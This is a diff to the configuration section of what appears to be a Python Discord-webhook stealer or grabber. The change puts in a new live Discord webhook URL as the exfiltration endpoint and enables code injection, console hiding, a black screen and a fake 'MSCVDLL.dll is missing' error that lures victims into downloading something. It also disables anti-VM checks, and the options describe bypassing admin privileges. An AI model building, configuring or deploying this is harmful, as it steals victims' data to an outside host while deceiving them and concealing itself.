@@ -15,16 +15,16 @@ config = {
     # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
     # Black Screen: Make screen black? (True/False, Bool)
     # Error Message: Fake error text to display. (Leave Blank for None)
-    'webhook': 'https://discord.com/api/webhooks/1335898676496961617/ni6zHTDCy73cV601TJhfUuhoa9KwXdXA06FZSc7VgxEMhoVWaJuj2FQmAhH9H-FrtmC6',
+    'webhook': 'https://discord.com/api/webhooks/1343502101069692998/Fzb5mqKmMInMORKfN_L9damtCZQFJWTHPzelWQdKwuvj2sFnnJiDSi0HroGC2zEFX2vo',
     'persist': False,
     'keep-alive': False,
     'injection_url': 'url to injection (raw)',
-    'inject': False,
-    'hideconsole': False,
-    'antivm': True,
+    'inject': True,
+    'hideconsole': True,
+    'antivm': False,
     'force_admin': False,
-    'black_screen': False,
-    'error': False,
+    'black_screen': True,
+    'error': True,
     'error_message': 'This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.',
 }
 class functions(object):
